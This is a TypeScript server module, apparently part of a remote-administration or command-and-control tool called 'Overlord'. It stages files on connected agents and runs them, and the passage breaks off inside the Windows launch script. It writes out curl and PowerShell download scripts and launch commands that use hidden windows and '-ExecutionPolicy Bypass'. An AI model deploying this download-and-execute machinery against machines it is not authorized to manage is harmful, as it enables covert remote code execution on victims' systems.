import os from "os";
import path from "path";
import fs from "fs/promises";
import { v4 as uuidv4 } from "uuid";
import { authenticateRequest } from "../../auth";
import { AuditAction, logAudit } from "../../auditLog";
import * as clientManager from "../../clientManager";
import { metrics } from "../../metrics";
import { encodeMessage } from "../../protocol";
import { requireClientAccess, requirePermission } from "../../rbac";
import {
  createUploadPull,
  ensureUploadPull,
  refreshUploadPullTtl,
  uploadPulls,
} from "../file-transfer-state";
import { sanitizeUploadFilename } from "../upload-security";
import { normalizeClientOs } from "../deploy-utils";
import {
  clientSupportsRelativeUploadPull,
  clientSupportsUploadProgress,
  REMOTE_EXECUTE_MIN_VERSION,
  selectUploadPullUrl,
} from "../client-version";
import { buildPullEndpoints } from "../upload-pull-url";
import { logger } from "../../logger";
import { psSingleQuote } from "./client-command-routes";

type RequestIpProvider = {
  requestIP: (req: Request) => { address?: string } | null | undefined;
};

type CommandReplyResult = {
  ok: boolean;
  message?: string;
  code?: string;
};

type PendingCommandReply = {
  resolve: (result: CommandReplyResult) => void;
  reject: (error: Error) => void;
  timeout: NodeJS.Timeout;
  clientId: string;
  onProgress?: (payload: any) => void;
};

type PendingScript = {
  resolve: (result: { ok?: boolean; result?: string; error?: string }) => void;
  reject: (error: Error) => void;
  timeout: NodeJS.Timeout;
  clientId: string;
};

export type PendingFileUploadChunk = {
  resolve: (result: {
    ok: boolean;
    offset?: number;
    received?: number;
    total?: number;
    error?: string;
  }) => void;
  reject: (error: Error) => void;
  timeout: NodeJS.Timeout;
  clientId: string;
};

type RemoteExecuteRouteDeps = {
  pendingCommandReplies: Map<string, PendingCommandReply>;
  pendingScripts: Map<string, PendingScript>;
  pendingFileUploadChunks: Map<string, PendingFileUploadChunk>;
  uploadTimeoutMs?: number;
  execTimeoutMs?: number;
  scriptTimeoutMs?: number;
  idleAckTimeoutMs?: number;
  idleProgressTimeoutMs?: number;
  httpProbeTimeoutMs?: number;
  wsChunkAckTimeoutMs?: number;
  methodSwitchSettleMs?: number;
  shellPullEnabled?: boolean;
  shellPullTimeoutMs?: number;
};

type RemoteExecuteMode = "upload_only" | "upload_and_run";
type TransferMethod = "http_pull" | "ws_chunks" | "shell_pull";

type TransferAttempt = {
  method: TransferMethod;
  ok: boolean;
  code?: string;
  message?: string;
  at: number;
};

type RemoteExecutePhase =
  | "queued"
  | "staging"
  | "client_transfer"
  | "chmod"
  | "ready"
  | "execute"
  | "succeeded"
  | "failed";

type RemoteExecuteStatus = "queued" | "running" | "ready" | "succeeded" | "failed";
type EndpointSource = "external_config" | "forwarded_host" | "request_host";
type TransferState =
  | "command_not_sent"
  | "command_sent_no_client_progress"
  | "client_transfer_active"
  | "client_transfer_complete";

type RemoteExecuteJobError = {
  code: string;
  message: string;
  phase: RemoteExecutePhase;
  bytesTransferred: number;
  totalBytes: number;
  destinationPath: string;
  pullOrigin?: string;
  resolvedUrl?: string;
  clientMessage?: string;
  serverMessage?: string;
  endpointSource: EndpointSource;
  clientVersion?: string;
  clientAcknowledged: boolean;
  transferState: TransferState;
};

type RemoteExecuteJob = {
  id: string;
  clientId: string;
  mode: RemoteExecuteMode;
  originalName: string;
  safeName: string;
  args: string[];
  hideWindow: boolean;
  tmpFilePath: string;
  pullId: string;
  pullOrigin: string;
  pullPath: string;
  resolvedUrl?: string;
  endpointSource: EndpointSource;
  clientVersion?: string;
  clientOs: string;
  clientAcknowledged: boolean;
  transferComplete: boolean;
  chmodDone: boolean;
  transferMethod?: TransferMethod;
  transferAttempts: TransferAttempt[];
  transferEpoch: number;
  bytesAtLastProgress: number;
  pullSecret: string;
  usedTransferFallback: boolean;
  usedExecFallback: boolean;
  commandSentAt?: number;
  uploadCommandId?: string;
  destinationPath: string;
  totalBytes: number;
  bytesTransferred: number;
  speedBytesPerSecond: number;
  percent: number;
  phase: RemoteExecutePhase;
  status: RemoteExecuteStatus;
  startedAt: number;
  updatedAt: number;
  completedAt?: number;
  expiresAt: number;
  timeout: NodeJS.Timeout;
  idleWatchdog?: NodeJS.Timeout;
  ackProbeTimer?: NodeJS.Timeout;
  lastClientMessage?: string;
  lastProgressAt?: number;
  lastClientStatus?: string;
  lastClientAttempt?: number;
  lastError?: { code: string; message: string };
  cancelled?: boolean;
  error?: RemoteExecuteJobError;
};

const MAX_FILE_SIZE = 200 * 1024 * 1024;
const UPLOAD_TIMEOUT_MS = 30 * 60_000;
const EXEC_TIMEOUT_MS = 60_000;
const SCRIPT_TIMEOUT_MS = 30_000;
const JOB_TTL_MS = 30 * 60_000;
const READY_TTL_MS = 30 * 60_000;
const IDLE_ACK_TIMEOUT_MS = 25_000;
const IDLE_PROGRESS_TIMEOUT_MS = 150_000;
const PULL_CLEANUP_GRACE_MS = 60_000;
const ACK_PROBE_DELAY_MS = 8_000;
const HTTP_PROBE_TIMEOUT_MS = 30_000;
const WS_FALLBACK_MAX_BYTES = 32 * 1024 * 1024;
const WS_CHUNK_SIZE = 512 * 1024;
const WS_CHUNK_CONCURRENCY = 4;
const WS_CHUNK_ACK_TIMEOUT_MS = 90_000;
const METHOD_SWITCH_SETTLE_MS = 1_500;
const SCRIPT_PULL_TIMEOUT_MS = 30 * 60_000;
const EXEC_LAUNCH_DELAY_SEC = 3;

function wsFallbackMaxBytes(): number {
  const raw = Number(process.env.REMOTE_EXECUTE_WS_FALLBACK_MAX_BYTES || "");
  if (Number.isFinite(raw) && raw > 0) return Math.floor(raw);
  return WS_FALLBACK_MAX_BYTES;
}

function shellPullEnabled(deps?: RemoteExecuteRouteDeps): boolean {
  if (typeof deps?.shellPullEnabled === "boolean") return deps.shellPullEnabled;
  const raw = String(process.env.REMOTE_EXECUTE_SHELL_PULL || "1").trim().toLowerCase();
  return raw !== "0" && raw !== "false" && raw !== "off" && raw !== "no";
}

const remoteExecuteJobs = new Map<string, RemoteExecuteJob>();

function now() {
  return Date.now();
}

function clampPercent(value: number): number {
  if (!Number.isFinite(value)) return 0;
  return Math.max(0, Math.min(100, Math.round(value)));
}

function transferPercentCap(job: RemoteExecuteJob): number {
  return job.mode === "upload_only" ? 100 : 90;
}

function cleanupPull(pullId: string) {
  const pull = uploadPulls.get(pullId);
  if (pull) {
    clearTimeout(pull.timeout);
    uploadPulls.delete(pullId);
  }
}

function clearIdleWatchdog(job: RemoteExecuteJob) {
  if (job.idleWatchdog) {
    clearTimeout(job.idleWatchdog);
    job.idleWatchdog = undefined;
  }
  if (job.ackProbeTimer) {
    clearTimeout(job.ackProbeTimer);
    job.ackProbeTimer = undefined;
  }
}

function cleanupStagingArtifacts(job: RemoteExecuteJob, opts: { immediate?: boolean } = {}) {
  const run = () => {
    cleanupPull(job.pullId);
    fs.unlink(job.tmpFilePath).catch(() => {});
  };
  if (opts.immediate || job.status === "succeeded" || job.status === "ready") {
    run();
    return;
  }
  setTimeout(run, PULL_CLEANUP_GRACE_MS);
}

function cleanupJob(job: RemoteExecuteJob, opts: { immediate?: boolean } = {}) {
  clearIdleWatchdog(job);
  cleanupStagingArtifacts(job, opts);
}

function rescheduleJobCleanup(job: RemoteExecuteJob, ttlMs: number) {
  if (job.timeout) clearTimeout(job.timeout);
  job.expiresAt = now() + ttlMs;
  job.timeout = setTimeout(() => {
    const current = remoteExecuteJobs.get(job.id);
    if (current === job) {
      remoteExecuteJobs.delete(job.id);
      cleanupJob(job, { immediate: true });
    }
  }, ttlMs);
}

function scheduleJobCleanup(job: RemoteExecuteJob) {
  rescheduleJobCleanup(job, JOB_TTL_MS);
  return job.timeout;
}

function transferState(job: RemoteExecuteJob): TransferState {
  if (job.transferComplete) return "client_transfer_complete";
  if (job.clientAcknowledged) return "client_transfer_active";
  if (job.commandSentAt) return "command_sent_no_client_progress";
  return "command_not_sent";
}

function serializeJob(job: RemoteExecuteJob) {
  return {
    ok: job.status !== "failed",
    jobId: job.id,
    clientId: job.clientId,
    mode: job.mode,
    phase: job.phase,
    status: job.status,
    percent: job.percent,
    bytesTransferred: job.bytesTransferred,
    totalBytes: job.totalBytes,
    speedBytesPerSecond: job.speedBytesPerSecond,
    destinationPath: job.destinationPath,
    pullOrigin: job.pullOrigin,
    resolvedUrl: job.resolvedUrl,
    endpointSource: job.endpointSource,
    clientVersion: job.clientVersion,
    clientOs: job.clientOs,
    clientAcknowledged: job.clientAcknowledged,
    transferState: transferState(job),
    transferMethod: job.transferMethod,
    transferAttempts: job.transferAttempts,
    usedTransferFallback: job.usedTransferFallback,
    usedExecFallback: job.usedExecFallback,
    canExecute: job.status === "ready",
    commandSentAt: job.commandSentAt,
    lastClientMessage: job.lastClientMessage,
    lastClientStatus: job.lastClientStatus,
    lastClientAttempt: job.lastClientAttempt,
    lastProgressAt: job.lastProgressAt,
    lastError: job.lastError,
    originalName: job.originalName,
    args: job.args,
    hideWindow: job.hideWindow,
    startedAt: job.startedAt,
    updatedAt: job.updatedAt,
    completedAt: job.completedAt,
    expiresAt: job.expiresAt,
    error: job.error,
    message:
      job.status === "failed"
        ? job.error?.message
        : job.status === "succeeded"
          ? `Executed ${job.originalName}`
          : job.status === "ready"
            ? `Uploaded ${job.originalName} — ready to execute`
            : undefined,
  };
}

function setJobPhase(job: RemoteExecuteJob, phase: RemoteExecutePhase, percent?: number) {
  job.phase = phase;
  if (phase === "succeeded") job.status = "succeeded";
  else if (phase === "failed") job.status = "failed";
  else if (phase === "ready") job.status = "ready";
  else job.status = "running";
  if (percent !== undefined) job.percent = clampPercent(percent);
  job.updatedAt = now();
}

function abortClientCommand(clientId: string, commandId?: string) {
  if (!commandId) return;
  try {
    const target = clientManager.getClient(clientId);
    if (!target?.ws) return;
    target.ws.send(encodeMessage({ type: "command_abort", commandId } as any));
  } catch {
    /* best effort */
  }
}

function resolvePendingCommand(
  deps: RemoteExecuteRouteDeps,
  commandId: string | undefined,
  result: CommandReplyResult,
) {
  if (!commandId) return;
  const pending = deps.pendingCommandReplies.get(commandId);
  if (!pending) return;
  clearTimeout(pending.timeout);
  deps.pendingCommandReplies.delete(commandId);
  pending.resolve(result);
}

function failJob(
  job: RemoteExecuteJob,
  code: string,
  message: string,
  extra: Partial<RemoteExecuteJobError> = {},
  deps?: RemoteExecuteRouteDeps,
) {
  if (job.status === "succeeded" || job.status === "failed") return;
  clearIdleWatchdog(job);
  if (deps && job.uploadCommandId) {
    abortClientCommand(job.clientId, job.uploadCommandId);
    resolvePendingCommand(deps, job.uploadCommandId, {
      ok: false,
      code,
      message,
    });
  }
  job.phase = extra.phase || job.phase || "failed";
  job.status = "failed";
  job.percent = Math.min(job.percent, 99);
  job.completedAt = now();
  job.updatedAt = job.completedAt;
  job.lastError = { code, message };
  job.error = {
    code,
    message,
    phase: job.phase,
    bytesTransferred: job.bytesTransferred,
    totalBytes: job.totalBytes,
    destinationPath: job.destinationPath,
    pullOrigin: job.pullOrigin,
    resolvedUrl: job.resolvedUrl,
    endpointSource: job.endpointSource,
    clientVersion: job.clientVersion,
    clientAcknowledged: job.clientAcknowledged,
    transferState: transferState(job),
    ...extra,
  };
  cleanupJob(job, { immediate: code === "cancelled" });
}

function succeedJob(job: RemoteExecuteJob) {
  clearIdleWatchdog(job);
  job.phase = "succeeded";
  job.status = "succeeded";
  job.bytesTransferred = job.totalBytes;
  job.percent = 100;
  job.completedAt = now();
  job.updatedAt = job.completedAt;
  job.lastError = undefined;
  cleanupJob(job, { immediate: true });
}

function markJobReady(job: RemoteExecuteJob) {
  clearIdleWatchdog(job);
  job.phase = "ready";
  job.status = "ready";
  job.bytesTransferred = job.totalBytes;
  job.percent = 100;
  job.completedAt = undefined;
  job.updatedAt = now();
  job.error = undefined;
  cleanupStagingArtifacts(job, { immediate: true });
  rescheduleJobCleanup(job, READY_TTL_MS);
}

function isJobStopped(job: RemoteExecuteJob): boolean {
  return (
    Boolean(job.cancelled) ||
    job.status === "failed" ||
    job.status === "succeeded" ||
    job.status === "ready"
  );
}

function isTerminalFailure(job: RemoteExecuteJob): boolean {
  return job.status === "failed";
}

function cancelRemoteExecuteJob(job: RemoteExecuteJob, deps: RemoteExecuteRouteDeps): boolean {
  if (job.status === "succeeded" || job.status === "failed") return false;
  if (job.status === "ready") {
    job.cancelled = true;
    failJob(job, "cancelled", "Remote execute discarded by operator", { phase: "ready" }, deps);
    remoteExecuteJobs.delete(job.id);
    return true;
  }
  job.cancelled = true;
  failJob(job, "cancelled", "Remote execute cancelled by operator", { phase: job.phase }, deps);
  return true;
}

function buildNoAckFailureMessage(job: RemoteExecuteJob, ackTimeoutMs: number): {
  code: string;
  message: string;
  serverMessage: string;
} {
  const version = job.clientVersion || "unknown";
  const waited = Math.round(ackTimeoutMs / 1000);
  if (!clientSupportsUploadProgress(job.clientVersion)) {
    return {
      code: "client_transfer_idle",
      message:
        `client agent v${version} did not finish the pull before the transfer timeout (legacy agents report no mid-transfer progress; check OVERLORD_EXTERNAL_URL reachability or rebuild agent to ≥ ${REMOTE_EXECUTE_MIN_VERSION})`,
      serverMessage: `No command_result within ${waited}s for legacy agent ${version} (no command_progress expected)`,
    };
  }
  return {
    code: "client_transfer_idle",
    message:
      "client did not acknowledge the transfer; the pull never started (agent may have ignored the command, or WS delivery failed — rebuild agent / check connectivity)",
    serverMessage: `No command_progress within ${waited}s after command send (clientVersion=${version})`,
  };
}

function softFailHttpTransfer(
  job: RemoteExecuteJob,
  deps: RemoteExecuteRouteDeps,
  result: CommandReplyResult,
) {
  if (job.status !== "running" || job.phase !== "client_transfer") return;
  if (job.transferComplete) return;
  if (!job.uploadCommandId) return;
  abortClientCommand(job.clientId, job.uploadCommandId);
  resolvePendingCommand(deps, job.uploadCommandId, result);
}

function scheduleIdleWatchdog(job: RemoteExecuteJob, deps: RemoteExecuteRouteDeps) {
  clearIdleWatchdog(job);
  if (job.phase !== "client_transfer" || job.status !== "running") return;
  if (job.transferMethod !== "http_pull") return;

  // Legacy agents (<2.3.8) only emit a final command_result — no progress acks.
  // No-ack probe soft-fails HTTP when fallbacks remain; idle is for progress-capable agents.
  if (!clientSupportsUploadProgress(job.clientVersion)) return;

  const ackTimeout = deps.idleAckTimeoutMs ?? IDLE_ACK_TIMEOUT_MS;
  const progressTimeout = deps.idleProgressTimeoutMs ?? IDLE_PROGRESS_TIMEOUT_MS;
  const delay = job.clientAcknowledged ? progressTimeout : ackTimeout;
  const canSoftFailToFallback = wsFallbackEligible(job) || shellPullEnabled(deps);

  if (!job.clientAcknowledged && delay > ACK_PROBE_DELAY_MS) {
    job.ackProbeTimer = setTimeout(() => {
      if (job.status !== "running" || job.phase !== "client_transfer" || job.clientAcknowledged) return;
      job.lastClientMessage =
        job.lastClientMessage ||
        `Still waiting for agent v${job.clientVersion || "unknown"} to acknowledge file_upload_http…`;
      job.lastClientStatus = "awaiting_ack";
      job.updatedAt = now();
    }, ACK_PROBE_DELAY_MS);
  }

  job.idleWatchdog = setTimeout(() => {
    if (job.status !== "running" || job.phase !== "client_transfer") return;
    if (job.transferMethod !== "http_pull") return;

    if (!job.clientAcknowledged) {
      const failure = buildNoAckFailureMessage(job, ackTimeout);
      if (canSoftFailToFallback) {
        softFailHttpTransfer(job, deps, {
          ok: false,
          code: failure.code,
          message: failure.message,
        });
        return;
      }
      failJob(job, failure.code, failure.message, {
        phase: "client_transfer",
        transferState: "command_sent_no_client_progress",
        serverMessage: failure.serverMessage,
      }, deps);
      return;
    }

    // Only stall-fail when bytes are not advancing (avoid thrashing slow-but-alive transfers).
    const bytesMoved = job.bytesTransferred > job.bytesAtLastProgress;
    if (bytesMoved) {
      job.bytesAtLastProgress = job.bytesTransferred;
      scheduleIdleWatchdog(job, deps);
      return;
    }

    if (canSoftFailToFallback) {
      softFailHttpTransfer(job, deps, {
        ok: false,
        code: "client_transfer_stalled",
        message: "client transfer stalled with no progress updates",
      });
      return;
    }

    failJob(
      job,
      "client_transfer_stalled",
      "client transfer stalled with no progress updates",
      {
        phase: "client_transfer",
        transferState: "client_transfer_active",
        clientMessage: job.lastClientMessage,
        serverMessage: `No progress update within ${Math.round(progressTimeout / 1000)}s`,
      },
      deps,
    );
  }, delay);
}

function parseArgs(raw: unknown): string[] {
  if (Array.isArray(raw)) {
    return raw.map((v) => String(v)).filter(Boolean);
  }
  const text = String(raw || "").trim();
  if (!text) return [];
  const out: string[] = [];
  const re = /"([^"]*)"|'([^']*)'|(\S+)/g;
  let m: RegExpExecArray | null;
  while ((m = re.exec(text))) {
    out.push(m[1] ?? m[2] ?? m[3] ?? "");
  }
  return out.filter(Boolean);
}

function parseHideWindow(raw: unknown): boolean {
  if (typeof raw === "boolean") return raw;
  const s = String(raw ?? "").trim().toLowerCase();
  return s === "1" || s === "true" || s === "yes" || s === "on";
}

function parseMode(raw: unknown): RemoteExecuteMode {
  const s = String(raw ?? "").trim().toLowerCase();
  if (s === "upload_only" || s === "upload-only" || s === "upload") return "upload_only";
  return "upload_and_run";
}

function updateJobFromProgress(job: RemoteExecuteJob, payload: any, deps: RemoteExecuteRouteDeps) {
  if (job.status !== "running") return;
  if (job.transferMethod !== "http_pull") return;
  job.clientAcknowledged = true;
  const transferred = Number(payload?.transferred);
  const total = Number(payload?.total);
  if (Number.isFinite(transferred) && transferred >= 0) {
    const next = Math.min(transferred, job.totalBytes || transferred);
    if (next > job.bytesTransferred) {
      job.bytesAtLastProgress = next;
    }
    job.bytesTransferred = next;
  }
  if (Number.isFinite(total) && total > 0 && total !== job.totalBytes) {
    job.totalBytes = total;
  }
  const speed = Number(payload?.speedBytesPerSecond);
  if (Number.isFinite(speed) && speed >= 0) {
    job.speedBytesPerSecond = speed;
  }
  if (typeof payload?.message === "string") {
    job.lastClientMessage = payload.message;
  }
  if (typeof payload?.status === "string") {
    job.lastClientStatus = payload.status;
  }
  if (typeof payload?.resolvedUrl === "string" && payload.resolvedUrl) {
    job.resolvedUrl = payload.resolvedUrl;
  }
  const attempt = Number(payload?.attempt);
  if (Number.isFinite(attempt) && attempt > 0) {
    job.lastClientAttempt = attempt;
  }
  job.lastProgressAt = now();
  job.updatedAt = job.lastProgressAt;
  if (job.phase === "queued" || job.phase === "staging") {
    setJobPhase(job, "client_transfer");
  }
  if (job.totalBytes > 0) {
    const cap = transferPercentCap(job);
    job.percent = clampPercent((job.bytesTransferred / job.totalBytes) * cap);
  }
  scheduleIdleWatchdog(job, deps);
}

function waitForCommandReply(
  deps: RemoteExecuteRouteDeps,
  clientId: string,
  command: any,
  timeout: { code: string; message: string },
  timeoutMs: number,
  onProgress?: (payload: any) => void,
): Promise<CommandReplyResult> {
  const cmdId = command.id || uuidv4();
  command.id = cmdId;

  const replyPromise = new Promise<CommandReplyResult>((resolve, reject) => {
    const timer = setTimeout(() => {
      deps.pendingCommandReplies.delete(cmdId);
      resolve({ ok: false, code: timeout.code, message: timeout.message });
    }, timeoutMs);
    deps.pendingCommandReplies.set(cmdId, { resolve, reject, timeout: timer, clientId, onProgress });
  });

  try {
    const currentTarget = clientManager.getClient(clientId);
    if (!currentTarget?.ws) throw new Error("Client is offline");
    currentTarget.ws.send(encodeMessage(command));
  } catch (error) {
    const pending = deps.pendingCommandReplies.get(cmdId);
    if (pending) {
      clearTimeout(pending.timeout);
      deps.pendingCommandReplies.delete(cmdId);
    }
    return Promise.resolve({
      ok: false,
      code: "send_command_failed",
      message: (error as Error)?.message || "Failed to send command",
    });
  }

  return replyPromise.catch((error) => ({
    ok: false,
    code: "send_command_failed",
    message: (error as Error)?.message || timeout.message,
  }));
}

function waitForScriptResult(
  deps: RemoteExecuteRouteDeps,
  clientId: string,
  script: string,
  scriptType: string,
  timeoutMs: number,
): Promise<{ ok: boolean; result?: string; error?: string; code?: string }> {
  const cmdId = uuidv4();
  const resultPromise = new Promise<{ ok: boolean; result?: string; error?: string; code?: string }>((resolve, reject) => {
    const timeout = setTimeout(() => {
      deps.pendingScripts.delete(cmdId);
      resolve({ ok: false, code: "execute_timeout", error: "Script execution timed out" });
    }, timeoutMs);
    deps.pendingScripts.set(cmdId, {
      resolve: (value) =>
        resolve({
          ok: Boolean(value?.ok),
          result: value?.result,
          error: value?.error,
        }),
      reject,
      timeout,
      clientId,
    });
  });

  try {
    const currentTarget = clientManager.getClient(clientId);
    if (!currentTarget?.ws) throw new Error("Client is offline");
    currentTarget.ws.send(
      encodeMessage({
        type: "command",
        commandType: "script_exec",
        id: cmdId,
        payload: { script, type: scriptType },
      }),
    );
  } catch (error) {
    const pending = deps.pendingScripts.get(cmdId);
    if (pending) {
      clearTimeout(pending.timeout);
      deps.pendingScripts.delete(cmdId);
    }
    return Promise.resolve({
      ok: false,
      code: "send_command_failed",
      error: (error as Error)?.message || "Failed to send script command",
    });
  }

  return resultPromise.catch((error) => ({
    ok: false,
    code: "send_command_failed",
    error: (error as Error)?.message || "Script execution failed",
  }));
}

function waitForUploadChunk(
  deps: RemoteExecuteRouteDeps,
  clientId: string,
  command: any,
  timeoutMs: number,
): Promise<{ ok: boolean; offset?: number; received?: number; total?: number; error?: string; code?: string }> {
  const cmdId = command.id || uuidv4();
  command.id = cmdId;

  const replyPromise = new Promise<{
    ok: boolean;
    offset?: number;
    received?: number;
    total?: number;
    error?: string;
    code?: string;
  }>((resolve, reject) => {
    const timer = setTimeout(() => {
      deps.pendingFileUploadChunks.delete(cmdId);
      resolve({ ok: false, code: "client_transfer_timeout", error: "upload chunk timed out" });
    }, timeoutMs);
    deps.pendingFileUploadChunks.set(cmdId, { resolve, reject, timeout: timer, clientId });
  });

  try {
    const currentTarget = clientManager.getClient(clientId);
    if (!currentTarget?.ws) throw new Error("Client is offline");
    currentTarget.ws.send(encodeMessage(command));
  } catch (error) {
    const pending = deps.pendingFileUploadChunks.get(cmdId);
    if (pending) {
      clearTimeout(pending.timeout);
      deps.pendingFileUploadChunks.delete(cmdId);
    }
    return Promise.resolve({
      ok: false,
      code: "send_command_failed",
      error: (error as Error)?.message || "Failed to send upload chunk",
    });
  }

  return replyPromise.catch((error) => ({
    ok: false,
    code: "send_command_failed",
    error: (error as Error)?.message || "upload chunk failed",
  }));
}

function destinationForClient(clientOs: string, jobId: string, safeName: string): string {
  if (clientOs === "windows") {
    return `C:\\Windows\\Temp\\Overlord\\rex-${jobId}\\${safeName}`;
  }
  return `/tmp/overlord/rex-${jobId}/${safeName}`;
}

function wsFallbackEligible(job: RemoteExecuteJob): boolean {
  return job.totalBytes <= wsFallbackMaxBytes();
}

function isOriginUnreachableMessage(message: string): boolean {
  return /connection refused|econnrefused|enotfound|getaddrinfo|no such host|network is unreachable|could not resolve|name or service not known|dial tcp|i\/o timeout|context deadline exceeded|tls handshake timeout|certificate|x509|ssl/i.test(
    message,
  );
}

/**
 * Whether HTTP failure may be retried via another transfer method.
 * Terminal agent failures after "accepted" are allowed (handler finished / cleaned temps).
 * In-flight stalls are allowed only after abort (caller aborts before switching).
 */
function canRetryTransferAfterHttp(
  job: RemoteExecuteJob,
  result: CommandReplyResult,
  failureCode: string,
): boolean {
  if (job.transferComplete) return false;
  const msg = String(result.message || "");
  if (failureCode === "client_unsupported") return true;
  if (/unknown command/i.test(msg) || /unsupported .* command version/i.test(msg)) return true;
  if (/invalid upload url/i.test(msg)) return true;

  // No ack / soft-failed probe / timeout before meaningful transfer.
  if (
    failureCode === "client_transfer_idle" ||
    failureCode === "client_transfer_timeout" ||
    result.code === "client_transfer_timeout" ||
    result.code === "client_transfer_idle"
  ) {
    return true;
  }

  // Stall after abort — safe to retry once.
  if (failureCode === "client_transfer_stalled" || result.code === "client_transfer_stalled") {
    return true;
  }

  // Terminal command_result failure (including after accepted progress).
  if (
    !result.ok &&
    result.code !== "send_command_failed" &&
    result.code !== "cancelled"
  ) {
    return true;
  }

  return false;
}

function isHttpFallbackEligible(
  job: RemoteExecuteJob,
  result: CommandReplyResult,
  failureCode: string,
): boolean {
  if (!wsFallbackEligible(job)) return false;
  return canRetryTransferAfterHttp(job, result, failureCode);
}

function isShellPullEligible(
  job: RemoteExecuteJob,
  result: CommandReplyResult,
  failureCode: string,
  deps: RemoteExecuteRouteDeps,
): boolean {
  if (!shellPullEnabled(deps)) return false;
  if (!job.pullOrigin || !/^https?:\/\//i.test(job.pullOrigin)) return false;
  if (!canRetryTransferAfterHttp(job, result, failureCode)) return false;
  const msg = String(result.message || failureCode || "");
  // Skip shell when HTTP already proved the origin is unreachable — same URL would fail.
  if (isOriginUnreachableMessage(msg) && failureCode !== "client_unsupported") {
    return false;
  }
  return true;
}

function recordTransferAttempt(
  job: RemoteExecuteJob,
  method: TransferMethod,
  result: CommandReplyResult,
) {
  job.transferAttempts.push({
    method,
    ok: Boolean(result.ok),
    code: result.code,
    message: result.message,
    at: now(),
  });
}

async function settleBeforeMethodSwitch(deps: RemoteExecuteRouteDeps) {
  const ms = deps.methodSwitchSettleMs ?? METHOD_SWITCH_SETTLE_MS;
  if (ms <= 0) return;
  await new Promise((resolve) => setTimeout(resolve, ms));
}

function ensureJobPullAlive(job: RemoteExecuteJob, ttlMs: number) {
  ensureUploadPull({
    pullId: job.pullId,
    clientId: job.clientId,
    filePath: job.tmpFilePath,
    fileName: job.safeName,
    size: job.totalBytes,
    ttlMs,
    pullSecret: job.pullSecret,
  });
  refreshUploadPullTtl(job.pullId, ttlMs);
}

export function buildRemoteExecuteShellPullScript(
  destinationPath: string,
  pullUrl: string,
  pullSecret: string,
  clientId: string,
  expectedBytes: number,
  clientOs: string,
): { script: string; type: string } {
  if (clientOs === "windows") {
    const qPath = psSingleQuote(destinationPath);
    const qUrl = psSingleQuote(pullUrl);
    const qSecret = psSingleQuote(pullSecret);
    const qClient = psSingleQuote(clientId);
    return {
      type: "powershell",
      script: `
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'
$path = ${qPath}
$url = ${qUrl}
$dir = Split-Path -Parent $path
if ($dir -and -not (Test-Path -LiteralPath $dir)) {
  New-Item -ItemType Directory -Path $dir -Force | Out-Null
}
foreach ($stale in @($path, ($path + '.httpuploading'), ($path + '.uploading'))) {
  if (Test-Path -LiteralPath $stale) { Remove-Item -LiteralPath $stale -Force -ErrorAction SilentlyContinue }
}
$headers = @{
  Authorization = ('Bearer ' + ${qSecret})
  'x-overlord-client-id' = ${qClient}
}
try {
  Invoke-WebRequest -Uri $url -Headers $headers -OutFile $path -UseBasicParsing
} catch {
  Write-Output ('download_failed:' + $_.Exception.Message)
  throw
}
if (-not (Test-Path -LiteralPath $path -PathType Leaf)) {
  Write-Output 'missing_file'
  throw 'missing_file'
}
$len = (Get-Item -LiteralPath $path).Length
if (${expectedBytes} -gt 0 -and $len -ne ${expectedBytes}) {
  Write-Output ('size_mismatch:' + $len + ':' + ${expectedBytes})
  Remove-Item -LiteralPath $path -Force -ErrorAction SilentlyContinue
  throw 'size_mismatch'
}
Write-Output 'downloaded'
`.trim(),
    };
  }

  const escapedPath = destinationPath.replace(/'/g, `'\\''`);
  const escapedUrl = pullUrl.replace(/'/g, `'\\''`);
  const escapedSecret = pullSecret.replace(/'/g, `'\\''`);
  const escapedClient = clientId.replace(/'/g, `'\\''`);
  return {
    type: "bash",
    script: `
set -e
path='${escapedPath}'
url='${escapedUrl}'
mkdir -p "$(dirname "$path")"
rm -f "$path" "$path.httpuploading" "$path.uploading" 2>/dev/null || true
code=$(curl -fsSL --connect-timeout 20 --max-time 0 \
  -H 'Authorization: Bearer ${escapedSecret}' \
  -H 'x-overlord-client-id: ${escapedClient}' \
  -o "$path" -w '%{http_code}' "$url" || true)
if [ "$code" != "200" ]; then
  echo "download_failed:http_$code"
  rm -f "$path" 2>/dev/null || true
  exit 1
fi
if [ ! -f "$path" ]; then
  echo missing_file
  exit 2
fi
len=$(wc -c < "$path" | tr -d ' ')
if [ ${expectedBytes} -gt 0 ] && [ "$len" != "${expectedBytes}" ]; then
  echo "size_mismatch:$len:${expectedBytes}"
  rm -f "$path"
  exit 3
fi
echo downloaded
`.trim(),
  };
}

function isExecFallbackEligible(result: CommandReplyResult): boolean {
  if (result.code === "execute_timeout" || result.code === "send_command_failed") return false;
  const msg = String(result.message || "");
  if (/unknown command/i.test(msg) || /unsupported .* command version/i.test(msg)) return true;
  if (/missing command/i.test(msg)) return false;
  if (
    /failed to start|cannot find|not found|access is denied|permission denied|the system cannot find/i.test(
      msg,
    )
  ) {
    return true;
  }
  // Generic explicit start failure (not timeout).
  if (!result.ok && result.code !== "execute_timeout") return true;
  return false;
}

function isMissingFileError(message?: string): boolean {
  return /missing_file|file not found|cannot find the (file|path)|the system cannot find the file/i.test(
    String(message || ""),
  );
}

export function buildRemoteExecuteLaunchScript(
  destinationPath: string,
  args: string[],
  hideWindow: boolean,
  clientOs: string,
): { script: string; type: string } {
  if (clientOs === "windows") {
    const qPath = psSingleQuote(destinationPath);
    const argList = args.map((a) => psSingleQuote(a)).join(", ");
    const windowStyle = hideWindow ? "Hidden" : "Normal";
    return {
      type: "powershell",
      script: `
$ErrorActionPreference = 'Stop'
Start-Sleep -Seconds ${EXEC_LAUNCH_DELAY_SEC}
$path = ${qPath}
if (-not (Test-Path -LiteralPath $path -PathType Leaf)) {
  Write-Output 'missing_file'
  throw 'missing_file'
}
$ext = [System.IO.Path]::GetExtension($path).ToLowerInvariant()
$argList = @(${argList})
switch ($ext) {
  '.bat' { $p = Start-Process -FilePath 'cmd.exe' -ArgumentList (@('/c', $path) + $argList) -WindowStyle ${windowStyle} -PassThru }
  '.cmd' { $p = Start-Process -FilePath 'cmd.exe' -ArgumentList (@('/c', $path) + $argList) -WindowStyle ${windowStyle} -PassThru }
  '.ps1' { $p = Start-Process -FilePath 'powershell.exe' -ArgumentList (@('-ExecutionPolicy','Bypass','-NoProfile','-File',$path) + $argList) -WindowStyle ${windowStyle} -PassThru }
  '.vbs' { $p = Start-Process -FilePath 'wscript.exe' -ArgumentList (@($path) + $argList) -WindowStyle ${windowStyle} -PassThru }
